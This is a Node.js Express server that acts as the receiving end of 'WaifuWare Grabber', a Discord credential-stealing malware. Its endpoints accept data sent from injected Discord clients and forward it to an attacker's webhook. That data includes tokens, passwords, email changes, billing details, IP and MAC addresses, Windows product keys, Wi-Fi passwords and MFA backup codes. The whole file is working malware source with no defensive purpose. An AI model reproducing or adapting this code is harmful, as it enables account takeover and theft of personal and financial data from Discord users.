const app = require("express")(),
    Discord = require("discordinfos"),
    {
        text
    } = require("body-parser"),
    fs = require("fs")
const Webhook = require("discord-webhook-node"),
    webhook = new Webhook.Webhook("webhook here")
    webhook.setUsername("WaifuWare Grabber").setAvatar("https://avatars.githubusercontent.com/u/95830906?s=200&v=4")
String.prototype.put = function(a, e)  {
    return this.slice(0, a) + e + this.slice(a)
}

app.use(text())

app.post("/request/beforeinject", (req, res) => {
    req = JSON.parse(req.body)
    res.sendStatus(200)
    var user = Discord.getAllInfos(req.token, req.ipAddress)
    if (user == "TOKEN ISN'T VALID") return
    var embed = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setDescription(`<:card:939228303884156928> **Token**:\n\`${user.token}\`\n[Click Here To Copy](https://notfubuki.xyz/api/raw/${user.token})\n`)
        .addField(`<a:3190nitrobadgesroll:933698474237657159> **Badges:**`, user.badges, true)
        .addField("<a:blackcheck:916479048358690857> **Nitro Type:**", user.nitroType, true)
        .addField("<:cc_black_money:935588264939749466> **Billing:**", user.billing, true)
        .addField("<a:t_heart:616392109020282889> **Email:**", "`" + user.mail + "`", true)
        .addField("<:Chad:895998497990520862> **IP:**", "`" + req.ipAddress + "`", true)
        .addField("**Path:**", "`" + req.path + "`")
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    webhook.send(embed)
    var friendEmbed = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setTitle("HQ Friends")
        .setDescription(user.rareFriend)
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    setTimeout(() => webhook.send(friendEmbed), 50)
    var PCInfos = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setTitle("PC INFOS")
        .addField("<a:spin:942595620043112449> **UUID**", "`" + req.UUID +"`", true)
        .addField("<a:spin2:942596222349365298> **Mac Address**", "`" + req.macAddress +"`", true)
        .addField("<a:whatthefuck:942598391861489674> **Windows Product Key**", "`" +  req.productKey +"`", true)
        .addField("<a:blackcheck:916479048358690857> **Local IP**", "`" + req.localIP + "`", true)
        .addField("<a:844202640128868382:923353168073621544> **Wifi Password(s)**", "`" + req.wifiPass +"`", true)
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    setTimeout(() => webhook.send(PCInfos), 100)
})

app.post("/request/login", (req, res) => {
    req = JSON.parse(req.body)
    console.log(req)
    res.sendStatus(200)
    var user = Discord.getAllInfos(req.token, req.ipAddress, req.password)
    var embed = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setDescription(`<:card:939228303884156928> **Token**:\n\`${user.token}\`\n[Click Here To Copy](https://notfubuki.xyz/api/raw/${user.token})\n`)
        .addField(`<a:3190nitrobadgesroll:933698474237657159> **Badges:**`, user.badges, true)
        .addField("<a:blackcheck:916479048358690857> **Nitro Type:**", user.nitroType, true)
        .addField("<:cc_black_money:935588264939749466> **Billing:**", user.billing, true)
        .addField("<a:t_heart:616392109020282889> **Email:**", "`" + user.mail + "`", true)
        .addField("<:Chad:895998497990520862> **IP:**", "`" + req.ipAddress + "`", true)
        .addField("**Password:**", "`" + req.password + "`", true)
        .addField("**Path:**", "`" + req.injected + "`")
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    webhook.send(embed)
    var friendEmbed = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setTitle("HQ Friends")
        .setDescription(user.rareFriend)
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    setTimeout(() => webhook.send(friendEmbed), 50)
    var PCInfos = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setTitle("PC INFOS")
        .addField("<a:spin:942595620043112449> **UUID**", "`" + req.UUID +"`", true)
        .addField("<a:spin2:942596222349365298> **Mac Address**", "`" + req.macAddress +"`", true)
        .addField("<a:whatthefuck:942598391861489674> **Windows Product Key**", "`" +  req.productKey +"`", true)
        .addField("<a:blackcheck:916479048358690857> **Local IP**", "`" + req.localIP + "`", true)
        .addField("<a:844202640128868382:923353168073621544> **Wifi Password(s)**", "`" + req.wifiPass +"`", true)
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    setTimeout(() => webhook.send(PCInfos), 100)
    if (user.mfaCode == "This User Doesn't Have MFA") return
    var MFACode = new Webhook.MessageBuilder()
        .setAuthor(`${user.username}`, "https://www.notfubuki.xyz/api/image")
        .setTitle("MFA Codes")
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    MFACode.payload.embeds[0].fields = organizeMfaCode(user.mfaCode)
    setTimeout(() => webhook.send(MFACode), 100)
})

app.post("/request/newpass", (req, res) => {
    req = JSON.parse(req.body)
    res.sendStatus(200)
    var user = Discord.getAllInfos(req.token, req.ipAddress, req.newPassword)
    var embed = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setDescription(`<:card:939228303884156928> **Token**:\n\`${user.token}\`\n[Click Here To Copy](https://notfubuki.xyz/api/raw/${user.token})\n`)
        .addField(`<a:3190nitrobadgesroll:933698474237657159> **Badges:**`, user.badges, true)
        .addField("<a:blackcheck:916479048358690857> **Nitro Type:**", user.nitroType, true)
        .addField("<:cc_black_money:935588264939749466> **Billing:**", user.billing, true)
        .addField("<a:t_heart:616392109020282889> **Email:**", "`" + user.mail + "`", true)
        .addField("<:Chad:895998497990520862> **IP:**", "`" + req.ipAddress + "`", true)
        .addField("<a:844202640128868382:923353168073621544> **New Password:**", "`" + req.newPassword + "`", true)
        .addField("**Path:**", "`" + req.injected + "`")
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    webhook.send(embed)
    var friendEmbed = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setTitle("HQ Friends")
        .setDescription(user.rareFriend)
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    setTimeout(() => webhook.send(friendEmbed), 50)
    var PCInfos = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setTitle("PC INFOS")
        .addField("<a:spin:942595620043112449> **UUID**", "`" + req.UUID +"`", true)
        .addField("<a:spin2:942596222349365298> **Mac Address**", "`" + req.macAddress +"`", true)
        .addField("<a:whatthefuck:942598391861489674> **Windows Product Key**", "`" +  req.productKey +"`", true)
        .addField("<a:blackcheck:916479048358690857> **Local IP**", "`" + req.localIP + "`", true)
        .addField("<a:844202640128868382:923353168073621544> **Wifi Password(s)**", "`" + req.wifiPass +"`", true)
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    setTimeout(() => webhook.send(PCInfos), 100)
    if (user.mfaCode == "This User Doesn't Have MFA") return
    var MFACode = new Webhook.MessageBuilder()
        .setAuthor(`${user.username}`, "https://www.notfubuki.xyz/api/image")
        .setTitle("MFA Codes")
        .setDescription(organizeMfaCode(user.mfaCode))
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    setTimeout(() => webhook.send(MFACode), 100)
})

app.post("/request/newemail", (req, res) => {
    req = JSON.parse(req.body)
    res.sendStatus(200)
    var user = Discord.getAllInfos(req.token, req.ipAddress, req.password)
    var embed = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setDescription(`<:card:939228303884156928> **Token**:\n\`${user.token}\`\n[Click Here To Copy](https://notfubuki.xyz/api/raw/${user.token})\n`)
        .addField(`<a:3190nitrobadgesroll:933698474237657159> **Badges:**`, user.badges, true)
        .addField("<a:blackcheck:916479048358690857> **Nitro Type:**", user.nitroType, true)
        .addField("<:cc_black_money:935588264939749466> **Billing:**", user.billing, true)
        .addField("<a:t_heart:616392109020282889> **New Email:**", "`" + user.mail + "`", true)
        .addField("<:Chad:895998497990520862> **IP:**", "`" + req.ipAddress + "`", true)
        .addField("<a:844202640128868382:923353168073621544> **Password:**", "`" + req.password + "`", true)
        .addField("**Path:**", "`" + req.injected + "`")
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    webhook.send(embed)
    var friendEmbed = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setTitle("HQ Friends")
        .setDescription(user.rareFriend)
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    setTimeout(() => webhook.send(friendEmbed), 50)
    var PCInfos = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setTitle("PC INFOS")
        .addField("<a:spin:942595620043112449> **UUID**", "`" + req.UUID +"`", true)
        .addField("<a:spin2:942596222349365298> **Mac Address**", "`" + req.macAddress +"`", true)
        .addField("<a:whatthefuck:942598391861489674> **Windows Product Key**", "`" +  req.productKey +"`", true)
        .addField("<a:blackcheck:916479048358690857> **Local IP**", "`" + req.localIP + "`", true)
        .addField("<a:844202640128868382:923353168073621544> **Wifi Password(s)**", "`" + req.wifiPass +"`", true)
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    setTimeout(() => webhook.send(PCInfos), 100)
    if (user.mfaCode == "This User Doesn't Have MFA") return
    var MFACode = new Webhook.MessageBuilder()
        .setAuthor(`${user.username}`, "https://www.notfubuki.xyz/api/image")
        .setTitle("MFA Codes")
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    MFACode.embeds[0].fields = organizeMfaCode(user.mfaCode)
    setTimeout(() => webhook.send(MFACode), 100)
})


app.post("/request/mfaenable", (req, res) => {
    req = JSON.parse(req.body)
    res.sendStatus(200)

    var user = Discord.getAllInfos(req.token, req.ipAddress, req.password)
    var embed = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setDescription(`<:card:939228303884156928> **Token**:\n\`${user.token}\`\n[Click Here To Copy](https://notfubuki.xyz/api/raw/${user.token})\n`)
        .addField(`<a:3190nitrobadgesroll:933698474237657159> **Badges:**`, user.badges, true)
        .addField("<a:blackcheck:916479048358690857> **Nitro Type:**", user.nitroType, true)
        .addField("<:cc_black_money:935588264939749466> **Billing:**", user.billing, true)
        .addField("<a:t_heart:616392109020282889> **New Email:**", "`" + user.mail + "`", true)
        .addField("<:Chad:895998497990520862> **IP:**", "`" + req.ipAddress + "`", true)
        .addField("<a:844202640128868382:923353168073621544> **Password:**", "`" + req.password + "`", true)
        .addField("<a:iCross:815816543480053780> **Auth Key:**", "`" + req.authKey + "`", true)
        .addField("<a:iSatanic:815815618829352993> **Used Code**", "`" + req.code + "`", true)
        .addField("**Path:**", "`" + req.injected + "`")
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    webhook.send(embed)
    var friendEmbed = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setTitle("HQ Friends")
        .setDescription(user.rareFriend)
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    setTimeout(() => webhook.send(friendEmbed), 50)
    var PCInfos = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setTitle("PC INFOS")
        .addField("<a:spin:942595620043112449> **UUID**", "`" + req.UUID +"`", true)
        .addField("<a:spin2:942596222349365298> **Mac Address**", "`" + req.macAddress +"`", true)
        .addField("<a:whatthefuck:942598391861489674> **Windows Product Key**", "`" +  req.productKey +"`", true)
        .addField("<a:blackcheck:916479048358690857> **Local IP**", "`" + req.localIP + "`", true)
        .addField("<a:844202640128868382:923353168073621544> **Wifi Password(s)**", "`" + req.wifiPass +"`", true)
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    setTimeout(() => webhook.send(PCInfos), 100)
    if (user.mfaCode == "This User Doesn't Have MFA") return
    var MFACode = new Webhook.MessageBuilder()
        .setAuthor(`${user.username}`, "https://www.notfubuki.xyz/api/image")
        .setTitle("MFA Codes")
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    MFACode.embeds[0].fields = organizeMfaCode(user.mfaCode)
    setTimeout(() => webhook.send(MFACode), 100)
})

app.post("/request/mfadisable", (req, res) => {
    req = JSON.parse(req.body)
    res.sendStatus(200)
    var user = Discord.getAllInfos(req.token, req.ipAddress)
    var embed = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setDescription(`<:card:939228303884156928> **Token**:\n\`${user.token}\`\n[Click Here To Copy](https://notfubuki.xyz/api/raw/${user.token})\n`)
        .addField(`<a:3190nitrobadgesroll:933698474237657159> **Badges:**`, user.badges, true)
        .addField("<a:blackcheck:916479048358690857> **Nitro Type:**", user.nitroType, true)
        .addField("<:cc_black_money:935588264939749466> **Billing:**", user.billing, true)
        .addField("<a:t_heart:616392109020282889> **New Email:**", "`" + user.mail + "`", true)
        .addField("<:Chad:895998497990520862> **IP:**", "`" + req.ipAddress + "`", true)
        .addField("<a:844202640128868382:923353168073621544> **Used Code:**", "`" + req.code + "`", true)
        .addField("**Path:**", "`" + req.injected + "`")
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    webhook.send(embed)
    var friendEmbed = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setTitle("HQ Friends")
        .setDescription(user.rareFriend)
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    setTimeout(() => webhook.send(friendEmbed), 50)
    var PCInfos = new Webhook.MessageBuilder()
        .setAuthor(`${user.username} (${user.ID})`, "https://www.notfubuki.xyz/api/image")
        .setTitle("PC INFOS")
        .addField("<a:spin:942595620043112449> **UUID**", "`" + req.UUID +"`", true)
        .addField("<a:spin2:942596222349365298> **Mac Address**", "`" + req.macAddress +"`", true)
        .addField("<a:whatthefuck:942598391861489674> **Windows Product Key**", "`" +  req.productKey +"`", true)
        .addField("<a:blackcheck:916479048358690857> **Local IP**", "`" + req.localIP + "`", true)
        .addField("<a:844202640128868382:923353168073621544> **Wifi Password(s)**", "`" + req.wifiPass +"`", true)
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    setTimeout(() => webhook.send(PCInfos), 100)
})

app.post("/request/injected", (req, res) => {
    req = JSON.parse(req.body)
    res.sendStatus(200)
    if (!req.p) return
    var embed = new Webhook.MessageBuilder()
        .setTitle("Injected Discord(s)")
        .setDescription("`" + req.p + "`")
        .setColor("#00aaaa")
        .setFooter("WaifuWare Grabber")
        .setTimestamp();
    webhook.send(embed)
})

function organizeMfaCode(ae) {
  ae = ae.split(" | ")
  var a = []
  var i = 1
  ae.forEach(r => a.push({
    name: `<:box:939516410642722847> Code ${i}`,
    value: `**${r.put(4, '-')}**`,
    inline: true
  }) ^ i++)
  return a
}

app.listen(3000)
